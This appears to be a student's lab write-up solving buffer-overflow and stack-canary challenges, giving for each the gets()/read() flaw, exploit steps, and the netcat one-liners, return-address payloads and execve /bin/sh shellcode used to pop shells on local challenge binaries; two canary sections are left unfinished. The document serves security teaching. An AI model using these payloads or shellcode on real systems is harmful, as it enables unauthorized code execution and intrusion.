Written by Francis Trien Quoc Dong (z5118740)

buffer-1
=========

General overview of problem faced
----------------------------------
1. Had to learn python to print out hex
2. Had to research how to make sure the keep nc open after the python exploits prints

List of vulnerabilities
------------------------
1. The input for gets() can overflow a fixed buffer on the stack. gets() reads until it reaches a newline or EOF

Steps to exploit
-----------------
1. Look through the code and notice it has a buffer of 64 chars and gets which is very vulnerable.
2. Enter exactly 64 bytes of random junk long to overflow the buffer.
3. At the end of the 64 bytes add the address "0x80491d2" and make sure to it jumps to the address we need. (in a disassembler this address is the win function)
4. Make sure that the address "0x80491d2" is printed backwards as the operating system is litte endian. (eg. either use '\xd2\x91\x04\x08' or struct.pack("I", 0x080491d2))
5. cat flag file

Script/Command used
--------------------
```
(python -c "print(('A'*64)) + '\xd2\x91\x04\x08'"; cat) | nc 0.0.0.0 5001
```

buffer-2
=========

General overview of problem faced
----------------------------------
1. Had to research on why 64 bytes wasn't enough for the buffer (watched liveoverflow's buffer overflow explanation)
2. Had to research on $eip, $esp, $ebp to see what it does during execution.
3. Had to research on how to use gdb for disassembling the code and see addresses
during execution.

List of vulnerabilities
------------------------
1. The input for gets() can overflow a fixed buffer on the stack as it only stops when it reaches EOF or a newline character

Steps to exploit
----------------
1. Look at the code source file and notice that it is similiar to buffer 1, except it doesn't print out the where the pointer to jump to is.
2. Run the binary file is a disassembler (I used gdb-peda).
3. Set a breakpoint at the return and run it adding in random bytes to see if we can overflow the base pointer.
4. Notice despite the array is 64 bytes it requires almost 76 bytes inorder to overflow the ebp, this is because of alignment with in the stack.
5. After we throw in 76 bytes of random junk, we need to find which address to jump too now.
6. Disassemble the win function in the disassessmbler and notice that we get 0x080484cd <+0>:   push   ebp. This just tells us the address for the win function is at 0x080484cd so we just need to jump to here.
7. Append the address 0x080484cd to the end of our 76 byte payload. Make sure it is printed backward (same as buffer 1) as it is little endian.
8. cat flag file


Script/Command used
--------------------
```
(python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR' + 'AAAA' + '\xcd\x84\x04\x08'"; cat ) | nc 0.0.0.0 5002
```

buffer-3
=========

General overview of problem faced
----------------------------------
1. Had to research on what shellcode is and how to use it (attempted to write it but ended up using shellstorm).

List of vulnerabilities
------------------------
1. read() add any standard input (file descriptor) into buffer and then buffer gets executed after. We can add anything and force a shell a spawn adding in the correct shellcode.
 
Steps to exploit
----------------
1. Look at the code source file and notice it has a buffer of 512 bytes and read into from standard input by read() and then executed afterwards.
2. Notice buffer is excuted so lets add some shellcode into it and force it to open a shell for us.
3. Should of wrote my own shell code but time constraint so copied it from shellcode. Find a shellcode (I got a 25 byte shellcode) that does an execve (a shellcode calls /bin/sh).
4. cat flag file


Script/Command used
--------------------
```
(python -c "print'\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'"; cat -) | nc 0.0.0.0 5003
```

buffer-4
=========

General overview of problem faced
----------------------------------
1. Had to research on what sheel code is and how to use it.
2. How to research on how stack will arrange itself in order calculate where to excute the stack.

List of vulnerabilities
------------------------
1. gets() is used and this will read in any amount of standard input until it reaches EOF or new line, meaning it can cause an overflow.
2. The hint when the binary is executed tells us the stack is executable meaning that we can use execve shell code in order to pop a shell.

Steps to exploit
-----------------
1. Disassemble the code to see how the stack pointer and base pointer is set out.
2. Notice that one of the prints says the shell is executable this must be a hint. So we need to overwrite the return address.
3. Note eax at esp + 10h, so we just need to to jump to this address so when the function returns, it would execute the shellcode on the stack.
4. To find eax, we can use ROPgadget and use the binary option to run the binary file and grepping eax we can find when eax is called and use the address to jump to.
5. We then execute a script that will go fill the buffer and execute the shellcode at the address we want it to to pop a shell.
6. cat the flag file

Script/Command used
--------------------
```
import struct

shellcode = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
payload = "\x41"*(8204-len(shellcode))
#payloadd = "BBBB"*23
eax = "\x06\x84\x04\x08"
print shellcode + payload + eax
```

canary-1
=========

General overview of problem faced
----------------------------------
1. Had to research in order to understand what a canary does to the stack

List of vulnerabilities
------------------------
1. Uses gets() which keeps on reading until it reaches a new line or an EOF allowing an easy buffer overflow.

Steps to exploit
----------------
1. Disassemble the main and notice it doesn't do much except for when it calls check canary.
2. Disassemble the check_canary function and notice it calls get and has a strcmp and test eax,eax and a jne after the test eax eax. 
3. We need to set a break point at strcmp to see what it is commparing and we notice that it is comparing against 1337.
4. Overflow the buffer at gets and add 1337 at the end of the payload so when it compares and test eax, eax is executed the value doesn't equal to zero and causes a bin/sh to be executed.

Script/Command used
--------------------
```
(python -c "print('AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH1337')";cat -)|nc 0.0.0.0 6001
```

canary-2
=========

General overview of problem faced
----------------------------------


List of vulnerabilities
------------------------


Steps to exploit
----------------


Script/Command used
--------------------
```

```

canary-3
=========

General overview of problem faced
----------------------------------
1. I had a lot of help for this question and fail to have a proper script.

List of vulnerabilities
------------------------


Steps to exploit
----------------
1. Disassemble the code to understand how the code works.
2. Find where the stack pointers are offset them correctly.
3. Find the canary to avoid it.
4. Find the exactly where the stack is and execute shellcode to pop and shell.
5. cat flag file

Script/Command used
--------------------
```

```